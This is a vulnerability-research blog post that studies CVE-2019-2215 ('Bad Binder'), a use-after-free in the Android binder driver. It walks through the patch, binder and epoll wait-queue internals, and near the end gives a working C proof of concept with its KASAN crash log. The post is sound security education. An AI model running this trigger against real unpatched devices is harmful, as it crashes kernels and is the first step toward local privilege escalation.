# CVE 2019-2215 - Part 1 - Android Research Journey

Welcome to the second entry in the Android research journey. As you can tell, we'll be diving right in. In the last blog post we've dived a bit into Binder, an important attack vector when you learn android VR. In this entry, we'll begin researching CVE 2019-2215, otherwise known as `Bad Binder`, and exploit it later on. 

Before proceeding with this series, seeing as I will only cover some concepts of Binder that are relevant, I recommend [this offsec blog](https://androidoffsec.withgoogle.com/posts/binder-internals/) of Binder internals.

CVE 2019-2215 is a UAF in binder.c that allows a LPE from an application to the Linux Kernel. Let's look at the diff:

```c
diff --git a/drivers/android/binder.c b/drivers/android/binder.c
index a340766b51fe..2ef8bd29e188 100644
--- a/drivers/android/binder.c
+++ b/drivers/android/binder.c
@@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc,
                if (t)
                        spin_lock(&t->lock);
        }
+
+       /*
+        * If this thread used poll, make sure we remove the waitqueue
+        * from any epoll data structures holding it with POLLFREE.
+        * waitqueue_active() is safe to use here because we're holding
+        * the inner lock.
+        */
+       if ((thread->looper & BINDER_LOOPER_STATE_POLL) &&
+           waitqueue_active(&thread->wait)) {
+               wake_up_poll(&thread->wait, POLLHUP | POLLFREE);
+       }
+
        binder_inner_proc_unlock(thread->proc);
```

Let's fetch the commit and check it out:
```bash
# This is needed if you did a shallow clone.
git fetch origin 7a3cee43e935b9d526ad07f20bf005ba7e74d05b
# Checkout the one before it
git checkout 7a3cee43e935b9d526ad07f20bf005ba7e74d05b~1

# Build android kernel with debugging enabled.
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
scripts/config \
        --enable CONFIG_ANDROID \
        --enable CONFIG_ANDROID_BINDER_IPC \
        --set-str CONFIG_ANDROID_BINDER_DEVICES "binder,hwbinder,vndbinder" \
        --enable CONFIG_KASAN \
        --enable CONFIG_KASAN_INLINE \
        --enable CONFIG_KCOV \
        --enable CONFIG_LOCKDEP \
        --enable CONFIG_PROVE_LOCKING \
        --enable CONFIG_DEBUG_KERNEL \
        --enable CONFIG_KALLSYMS \
        --enable CONFIG_KALLSYMS_ALL \
        --enable CONFIG_FRAME_POINTER \
        --enable CONFIG_KGDB \
        --enable CONFIG_KGDB_SERIAL_CONSOLE \
        --enable CONFIG_DEBUG_ATOMIC_SLEEP \
        --enable CONFIG_SERIAL_AMBA_PL011 \
        --enable CONFIG_MAGIC_SYSRQ \
        --enable CONFIG_DEVTMPFS \
        --enable CONFIG_DEVTMPFS_MOUNT \
        --disable CONFIG_UBSAN \
        --disable CONFIG_RANDOMIZE_BASE
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- \
    HOSTCFLAGS="-fcommon" \
    olddefconfig  
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- \
    HOSTCFLAGS="-fcommon" \
    -j$(nproc)
```

This should now build you an android kernel with whatever we need. I did not plan to elaborate on this, but use `busybox` to create your `initramfs` and `QEMU` to emulate the kernel itself. You should now have `/dev/binder` as well as KASAN in our vulnerable kernel.

Now, we know the patch was added in `binder_thread_release`. Let's take a look at how it looked beforehand:

```c
static int binder_thread_release(struct binder_proc *proc,
				 struct binder_thread *thread)
{
	struct binder_transaction *t;
	struct binder_transaction *send_reply = NULL;
	int active_transactions = 0;
	struct binder_transaction *last_t = NULL;

	binder_inner_proc_lock(thread->proc);
	/*
	 * take a ref on the proc so it survives
	 * after we remove this thread from proc->threads.
	 * The corresponding dec is when we actually
	 * free the thread in binder_free_thread()
	 */
	proc->tmp_ref++;
	/*
	 * take a ref on this thread to ensure it
	 * survives while we are releasing it
	 */
	atomic_inc(&thread->tmp_ref);
	rb_erase(&thread->rb_node, &proc->threads);
	t = thread->transaction_stack;
	if (t) {
		spin_lock(&t->lock);
		if (t->to_thread == thread)
			send_reply = t;
	}
	thread->is_dead = true;

	while (t) {
		last_t = t;
		active_transactions++;
		binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
			     "release %d:%d transaction %d %s, still active\n",
			      proc->pid, thread->pid,
			     t->debug_id,
			     (t->to_thread == thread) ? "in" : "out");

		if (t->to_thread == thread) {
			t->to_proc = NULL;
			t->to_thread = NULL;
			if (t->buffer) {
				t->buffer->transaction = NULL;
				t->buffer = NULL;
			}
			t = t->to_parent;
		} else if (t->from == thread) {
			t->from = NULL;
			t = t->from_parent;
		} else
			BUG();
		spin_unlock(&last_t->lock);
		if (t)
			spin_lock(&t->lock);
	}
	
	// --> patch was addded here!
	binder_inner_proc_unlock(thread->proc);

	if (send_reply)
		binder_send_failed_reply(send_reply, BR_DEAD_REPLY);
	binder_release_work(proc, &thread->todo);
	binder_thread_dec_tmpref(thread);
	return active_transactions;
}
```

There are a lot of things we don't really understand as of now, so let's first understand a few concepts. 

The first object we need to get familiar with is `binder_proc`. It is practically a client in Binder. It is the very first object that is allocated when a process opens the Binder device:

```c
struct binder_proc {
	struct hlist_node proc_node;
	struct rb_root threads;
	struct rb_root nodes;
	struct rb_root refs_by_desc;
	struct rb_root refs_by_node;
	struct list_head waiting_threads;
	int pid;
	struct task_struct *tsk;
	const struct cred *cred;
	struct hlist_node deferred_work_node;
	int deferred_work;
	int outstanding_txns;
	bool is_dead;
	bool is_frozen;
	bool sync_recv;
	bool async_recv;
	wait_queue_head_t freeze_wait;
	struct list_head todo;
	struct binder_stats stats;
	struct list_head delivered_death;
	int max_threads;
	int requested_threads;
	int requested_threads_started;
	int tmp_ref;
	struct binder_priority default_priority;
	struct dentry *debugfs_entry;
	struct binder_alloc alloc;
	struct binder_context *context;
	spinlock_t inner_lock;
	spinlock_t outer_lock;
	struct dentry *binderfs_entry;
	bool oneway_spam_detection_enabled;
};
```

The second is `binder_thread`, which is an object that represents a thread of a client (`binder_proc`) in Binder. The `binder_proc` maintains a reference to each `binder_thread` it owns, which is stored in an `rb_tree`, and the root node is in the `threads` field of the `binder_proc` struct.

```c
struct binder_thread {
	struct binder_proc *proc;
	struct rb_node rb_node;
	struct list_head waiting_thread_node;
	int pid;
	int looper;              /* only modified by this thread */
	bool looper_need_return; /* can be written by other thread */
	struct binder_transaction *transaction_stack;
	struct list_head todo;
	bool process_todo;
	struct binder_error return_error;
	struct binder_error reply_error;
	struct binder_extended_error ee;
	wait_queue_head_t wait;
	struct binder_stats stats;
	atomic_t tmp_ref;
	bool is_dead;
	struct task_struct *task;
	spinlock_t prio_lock;
	struct binder_priority prio_next;
	enum binder_prio_state prio_state;
};
```

Now, let's dive into specifics that actually involve code. Note the comments starting with `-->` to mark my remarks. Let's start with opening Binder. When we run the following code:
```c
int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
```

What happens is that in kernel space, the function `open_binder(..)` is called:
```c
static int binder_open(struct inode *nodp, struct file *filp)
{
	struct binder_proc_wrap *proc_wrap;
	struct binder_proc *proc, *itr;
	struct binder_device *binder_dev;
	struct binderfs_info *info;
	struct dentry *binder_binderfs_dir_entry_proc = NULL;
	bool existing_pid = false;
	
	...
	
	// --> Allocating the `binder_proc` as we said before.
	proc_wrap = kzalloc(sizeof(*proc_wrap), GFP_KERNEL);
	if (proc_wrap == NULL)
		return -ENOMEM;
	proc = &proc_wrap->proc;

	...
	
	refcount_inc(&binder_dev->ref);
	proc->context = &binder_dev->context;
	
	// --> Creates an allocater for the binder_proc.
	binder_alloc_init(&proc->alloc);
	
	...
	
	proc->pid = current->group_leader->pid;
	INIT_LIST_HEAD(&proc->delivered_death);
	INIT_LIST_HEAD(&proc_wrapper(proc)->delivered_freeze);
	INIT_LIST_HEAD(&proc->waiting_threads);
	filp->private_data = proc;

	mutex_lock(&binder_procs_lock);
	hlist_for_each_entry(itr, &binder_procs, proc_node) {
		if (itr->pid == proc->pid) {
			existing_pid = true;
			break;
		}
	}
	hlist_add_head(&proc->proc_node, &binder_procs);
	mutex_unlock(&binder_procs_lock);
	
	...

	return 0;
}
```

We can therefore see that it simply initializes the `binder_proc` fields, and creates a Binder entry for the process.

Now that we have some more information, we should take a look at what the comment in the patch says:
```c
/*
If this thread used poll, make sure we remove the waitqueue
from any epoll data structures holding it with POLLFREE.
waitqueue_active() is safe to use here because we're holding
the inner lock.
*/
```

Okay, so it seems as if the UAF happens when the thread `poll`s the `ioctl`. After researching for a bit, I have found that when a thread uses `poll`, `epoll`, etc., the function that is called is `binder_poll`:
```c
static unsigned int binder_poll(struct file *filp,
				struct poll_table_struct *wait)
{
  // --> get binder_proc.
	struct binder_proc *proc = filp->private_data;
	struct binder_thread *thread = NULL;
	bool wait_for_proc_work;
	
	// --> get specific process binder_thread.
	thread = binder_get_thread(proc);

	binder_inner_proc_lock(thread->proc);
	thread->looper |= BINDER_LOOPER_STATE_POLL;
	wait_for_proc_work = binder_available_for_proc_work_ilocked(thread);
	binder_inner_proc_unlock(thread->proc);
	
	// --> thread sleeps until it is signaled.
	poll_wait(filp, &thread->wait, wait);

	if (binder_has_work(thread, wait_for_proc_work))
		return POLLIN;

	return 0;
}
```

As we can see, the `binder_thread` has a `wait_queue` that it uses to wait until there's work to do (when polling). From the kernel patch we can also tell that the wait queue is relevant here.

Just to provide some extra information, the `wait` field is also used when we perform a synchronous `BINDER_WRITE_READ` with a transaction, as Binder sets our thread to sleep while it waits for the target process reply. 

But.. What is a wait queue? 

This is how the structures are defined:

```c
/*
 * A single wait-queue entry structure:
 */
struct wait_queue_entry {
	unsigned int		flags;
	void			*private;
	wait_queue_func_t	func;
	struct list_head	entry;
};

struct wait_queue_head {
	spinlock_t		lock;
	struct list_head	head;
};
typedef struct wait_queue_head wait_queue_head_t;
```

The `wait_queue_head` is simply a spinlock protected doubly linked list of `wait_queue_entry` nodes. Each entry has its `func` ptr with is *how* to be woken and *who* to wake via `private`. 

Adding a wait queue to a list looks like so:
```c
void add_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	unsigned long flags;

	wq_entry->flags &= ~WQ_FLAG_EXCLUSIVE;
	
	// --> spinlock protected doubly-linked list.
	spin_lock_irqsave(&wq_head->lock, flags);
	__add_wait_queue(wq_head, wq_entry);
	spin_unlock_irqrestore(&wq_head->lock, flags);
}

static inline void __add_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	struct list_head *head = &wq_head->head;
	struct wait_queue_entry *wq;

	list_for_each_entry(wq, &wq_head->head, entry) {
		if (!(wq->flags & WQ_FLAG_PRIORITY))
			break;
		head = &wq->entry;
	}
	list_add(&wq_entry->entry, head);
}
```

While removing from a wait queue looks like so:
```c
void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	unsigned long flags;

	spin_lock_irqsave(&wq_head->lock, flags);
	__remove_wait_queue(wq_head, wq_entry);
	spin_unlock_irqrestore(&wq_head->lock, flags);
}

static inline void
__remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	list_del(&wq_entry->entry);
}
```

Pretty simple. Now, when a wait queue is signaled, a function called `__wake_up(...)` is called:
```c
static int __wake_up_common(struct wait_queue_head *wq_head, unsigned int mode,
			int nr_exclusive, int wake_flags, void *key,
			wait_queue_entry_t *bookmark)
{
	wait_queue_entry_t *curr, *next;
	int cnt = 0;

	lockdep_assert_held(&wq_head->lock);

	if (bookmark && (bookmark->flags & WQ_FLAG_BOOKMARK)) {
		curr = list_next_entry(bookmark, entry);

		list_del(&bookmark->entry);
		bookmark->flags = 0;
	} else
		curr = list_first_entry(&wq_head->head, wait_queue_entry_t, entry);

	if (&curr->entry == &wq_head->head)
		return nr_exclusive;

	list_for_each_entry_safe_from(curr, next, &wq_head->head, entry) {
		unsigned flags = curr->flags;
		int ret;

		if (flags & WQ_FLAG_BOOKMARK)
			continue;

		ret = curr->func(curr, mode, wake_flags, key);
		if (ret < 0)
			break;
		if (ret && (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
			break;

		if (bookmark && (++cnt > WAITQUEUE_WALK_BREAK_CNT) &&
				(&next->entry != &wq_head->head)) {
			bookmark->flags = WQ_FLAG_BOOKMARK;
			list_add_tail(&bookmark->entry, &next->entry);
			break;
		}
	}

	return nr_exclusive;
}

static int __wake_up_common_lock(struct wait_queue_head *wq_head, unsigned int mode,
			int nr_exclusive, int wake_flags, void *key)
{
	unsigned long flags;
	wait_queue_entry_t bookmark;
	int remaining = nr_exclusive;

	bookmark.flags = 0;
	bookmark.private = NULL;
	bookmark.func = NULL;
	INIT_LIST_HEAD(&bookmark.entry);

	do {
		spin_lock_irqsave(&wq_head->lock, flags);
		remaining = __wake_up_common(wq_head, mode, remaining,
						wake_flags, key, &bookmark);
		spin_unlock_irqrestore(&wq_head->lock, flags);
	} while (bookmark.flags & WQ_FLAG_BOOKMARK);

	return nr_exclusive - remaining;
}

int __wake_up(struct wait_queue_head *wq_head, unsigned int mode,
	      int nr_exclusive, void *key)
{
	return __wake_up_common_lock(wq_head, mode, nr_exclusive, 0, key);
}
```

Practically, it iterates over each entry in the wait queue and calls its `func` field. 

Now, we know the CVE is directly related to `binder_poll`. When we call `epoll_ioctl(...)` on the `ioctl` of the driver, eventually we reach a state in which we interact with a wait queue (`poll_wait(filp, &thread->wait, wait);`). Now that we have all of this information, let's try and disect what exactly happens there. 

The patch specifically suggests that there's a case in which the `waitqueue` is not removed from a certain `epoll` data structure that, when the `waitqueue` is freed, causes a UAF.

Let's trace back a little bit. The first thing we must understand is how the threads `waitqueue` is destroyed. That is actually a pretty simple logic. At the end of  `binder_thread_release`, there's this call:
```c
    binder_thread_dec_tmpref(thread);
```

That calls this function:
```c
static void binder_thread_dec_tmpref(struct binder_thread *thread)
{
	/*
	 * atomic is used to protect the counter value while
	 * it cannot reach zero or thread->is_dead is false
	 */
	binder_inner_proc_lock(thread->proc);
	atomic_dec(&thread->tmp_ref);
	if (thread->is_dead && !atomic_read(&thread->tmp_ref)) {
		binder_inner_proc_unlock(thread->proc);
		binder_free_thread(thread);
		return;
	}
	binder_inner_proc_unlock(thread->proc);
}
```

As we can see, before freeing the thread, it checks `thread->is_dead` which is set to true in `binder_thread_release`, and whether the ref count is 0, which, let's assume it is. It later on frees the entire thread structure with:
```c
static void binder_free_thread(struct binder_thread *thread)
{
	BUG_ON(!list_empty(&thread->todo));
	binder_stats_deleted(BINDER_STAT_THREAD);
	binder_proc_dec_tmpref(thread->proc);
	kfree(thread);
}
```

Assuming we have a certain `binder_thread` attached to our, we can simply call `binder_thread_release` using:
```c
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
```

This just gives us the knowledge we need to actually free a `binder_thread`. How can we do something with this?

Let's start looking at what actually happens inside of the wait queue. The `poll` function called inside `binder_poll` is:
```c
static inline void poll_wait(struct file * filp, wait_queue_head_t * wait_address, poll_table *p)
{
	if (p && p->_qproc && wait_address)
		p->_qproc(filp, wait_address, p);
}
```

The default for `_qproc` (and the one that will be called in Binder) is `ep_ptable_queue_proc`:
```c
static void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead,
				 poll_table *pt)
{
	struct epitem *epi = ep_item_from_epqueue(pt);
	struct eppoll_entry *pwq;

	if (epi->nwait >= 0 && (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) {
		init_waitqueue_func_entry(&pwq->wait, ep_poll_callback);
		pwq->whead = whead;
		pwq->base = epi;
		if (epi->event.events & EPOLLEXCLUSIVE)
			add_wait_queue_exclusive(whead, &pwq->wait);
		else
			add_wait_queue(whead, &pwq->wait);
		list_add_tail(&pwq->llink, &epi->pwqlist);
		epi->nwait++;
	} else {
		/* We have to signal that an error occurred */
		epi->nwait = -1;
	}
}
```

As we can see, calling `binder_poll` does not actually causes the `thread` to sleep and wait to be signaled (it is upon the use, for example, of `epoll_wait` that it is done). It simply adds us to the wait queue. 

`epitem` does not look interesting as it does not get initialized with anything that is actually related to the `binder_thread`. However, we can see that there's the `pwq`, which is allocated and then points to the `whead`, which is a pointer to a member in the `binder_thread`:
```c
/* Wait structure used by the poll hooks */
struct eppoll_entry {
	/* List header used to link this structure to the "struct epitem" */
	struct list_head llink;
	/* The "base" pointer is set to the container "struct epitem" */
	struct epitem *base;
	/*
	 * Wait queue item that will be linked to the target file wait
	 * queue head.
	 */
	wait_queue_entry_t wait;
	/* The wait queue head that linked the "wait" wait queue item */
	wait_queue_head_t *whead;
};
```

Things are starting to get clearer here as we progress. 

Let's do a quick summary of what we know:
  1. When you open `/dev/binder`, Binder allocates `binder_proc` and a `binder_thread` for the thread.
  2. When you call `epoll_ctl(..., EPOLL_CTL_ADD, ...)`, you allocate an `eppoll_entry` object in the kernel heap - The thread does NOT sleep here!
  3. You may, at this point, trigger `binder_thread_release` using `BINDER_THREAD_EXIT`, which will free `binder_thread`, leaving a dangling pointer at `eppoll_entry`.

We do not know yet when the dangling pointer will be used, but we're at a position where we can write a simple POC to see a KASAN crash:
```c
#include <sys/types.h>

#include <fcntl.h>
#include <linux/android/binder.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

int __initialize_binder(void) {
  int binder_fd;

  binder_fd = open("/dev/binder", O_RDONLY | O_CLOEXEC);
  if (binder_fd < 0) {
    perror("[-] Failed to open /dev/binder... Is binder enabled?");
    exit(-1);
  }

  printf("[!] Created `binder_thread` and `binder_proc`...\n");
  return binder_fd;
}

void __add_thread_to_waitqueue(int binder_fd) {
  struct epoll_event event;
  int epoll_fd = epoll_create1(0);
  if (epoll_fd < 0) {
    perror("[-] Failed to create epoll_fd, damn...");
    exit(-1);
  }

  event.events = EPOLLIN;
  event.data.fd = binder_fd;

  // This calls binder_poll that then adds us to the waiting list. This should
  // not block.
  epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);
  printf("[!] Added wait of binder_thread to `epoll_entry`...\n");
}

void __release_binder_thread(int binder_fd) {
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
}

int main() {
  int binder_fd, epoll_fd;
  struct epoll_event event;

  binder_fd = __initialize_binder();
  __add_thread_to_waitqueue(binder_fd);
  __release_binder_thread(binder_fd);

  printf("[!] If all went smoothly, we should crash...\n");
  return EXIT_SUCCESS;
}
```

And upon running it, it indeed works:
```bash
~ # ./poc
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] If all went smoothly, we should crash...
[    8.141946] ==================================================================
[    8.142557] BUG: KASAN: use-after-free in __lock_acquire+0x3068/0x437c
[    8.142919] Read of size 8 at addr ffff8000d756cd30 by task poc/1331
[    8.143296]
[    8.143711] CPU: 1 PID: 1331 Comm: poc Not tainted 4.14.16-g2ba5966eddef #5
[    8.144127] Hardware name: linux,dummy-virt (DT)
[    8.144736] Call trace:
[    8.144968] [<ffff200008093ba4>] dump_backtrace+0x0/0x61c
[    8.145429] [<ffff2000080941dc>] show_stack+0x1c/0x24
[    8.145710] [<ffff200009e820dc>] dump_stack+0x148/0x1ec
[    8.146143] [<ffff20000853c4e0>] print_address_description+0x5c/0x234
[    8.146457] [<ffff20000853c0e8>] kasan_report+0x15c/0x2e0
[    8.146872] [<ffff20000853c300>] __asan_report_load8_noabort+0x1c/0x24
[    8.147208] [<ffff200008252d0c>] __lock_acquire+0x3068/0x437c
[    8.147467] [<ffff2000082554a0>] lock_acquire+0xa0/0x14c
[    8.147722] [<ffff200009ed08a4>] _raw_spin_lock_irqsave+0x84/0xb0
[    8.148117] [<ffff2000082310a4>] remove_wait_queue+0x64/0x240
[    8.148418] [<ffff200008691b18>] ep_unregister_pollwait.isra.0+0x158/0x440
[    8.148685] [<ffff2000086938f0>] ep_free+0x110/0x280
[    8.148949] [<ffff200008693aa4>] ep_eventpoll_release+0x44/0x60
[    8.149290] [<ffff20000859acf0>] __fput+0x28c/0x65c
[    8.149588] [<ffff20000859b164>] ____fput+0x18/0x20
[    8.149805] [<ffff2000081af56c>] task_work_run+0x160/0x1f4
[    8.150097] [<ffff2000081587ec>] do_exit+0x824/0x1378
[    8.150346] [<ffff2000081594b8>] do_group_exit+0x118/0x300
[    8.150588] [<ffff2000081596c0>] __wake_up_parent+0x0/0x64
[    8.150956] Exception stack(0xffff8000d73a7ec0 to 0xffff8000d73a8000)
[    8.151455] 7ec0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    8.151992] 7ee0: 0000000000401bfc 0000000000404860 61206649205d215b 20746e6577206c6c
[    8.152654] 7f00: 000000000000005e 6f6873206577202c 6f6f6d7320746e65 6577202c796c6874
[    8.153144] 7f20: 20646c756f687320 2e2e2e6873617263 0000000000000000 0000000000000000
[    8.153522] 7f40: 00000000004005e0 0000000000000000 0000000000000000 0000000000000000
[    8.153877] 7f60: 0000ffffcdedc188 00000000004003a8 0000ffffcdedc198 0000000000000000
[    8.154307] 7f80: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    8.154747] 7fa0: 0000000000000000 0000ffffcdedc130 0000000000400154 0000ffffcdedc130
[    8.155167] 7fc0: 0000000000401154 0000000060000000 0000000000000000 000000000000005e
[    8.155501] 7fe0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    8.155884] [<ffff2000080846f0>] el0_svc_naked+0x24/0x28
[    8.156242]
[    8.156431] Allocated by task 1331:
[    8.156785]  kasan_kmalloc+0xdc/0x180
[    8.157121]  binder_get_thread+0x1e8/0x860
[    8.157355]  binder_poll+0x94/0x56c
[    8.157572]  ep_insert+0x4ac/0x1480
[    8.157814]  SyS_epoll_ctl+0x964/0x1210
[    8.158106]  el0_svc_naked+0x24/0x28
[    8.158325]
[    8.158483] Freed by task 1331:
[    8.158862]  kasan_slab_free+0xa4/0x19c
[    8.159304]  kfree+0x94/0x220
[    8.159591]  binder_thread_dec_tmpref+0x264/0x348
[    8.159912]  binder_thread_release+0x2b8/0x50c
[    8.160226]  binder_ioctl+0x810/0x103c
[    8.160531]  do_vfs_ioctl+0xd9c/0x1520
[    8.160838]  SyS_ioctl+0xa4/0xc0
[    8.161187]  el0_svc_naked+0x24/0x28
[    8.161444]
[    8.161653] The buggy address belongs to the object at ffff8000d756cc80
[    8.161653]  which belongs to the cache kmalloc-512 of size 512
[    8.162650] The buggy address is located 176 bytes inside of
[    8.162650]  512-byte region [ffff8000d756cc80, ffff8000d756ce80)
[    8.163646] The buggy address belongs to the page:
[    8.164520] page:ffff7e00035d5b00 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0
[    8.165311] flags: 0x1fffc00000008100(slab|head)
[    8.165913] raw: 1fffc00000008100 0000000000000000 0000000000000000 0000000180190019
[    8.166363] raw: dead000000000100 dead000000000200 ffff8000dac03800 0000000000000000
[    8.166842] page dumped because: kasan: bad access detected
[    8.167203]
[    8.167375] Memory state around the buggy address:
[    8.167779]  ffff8000d756cc00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    8.168197]  ffff8000d756cc80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.168529] >ffff8000d756cd00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.168951]                                      ^
[    8.169251]  ffff8000d756cd80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.169596]  ffff8000d756ce00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.169980] ==================================================================
[    8.170472] Disabling lock debugging due to kernel taint
```

In this blog post, we've researched together, using the patch only, the full details of the Bad Binder CVE, and put together a simple POC to trigger the UAF. In the next blog post, we'll take this up a notch by achieving LPE using this vulnerability.

'Till next time.
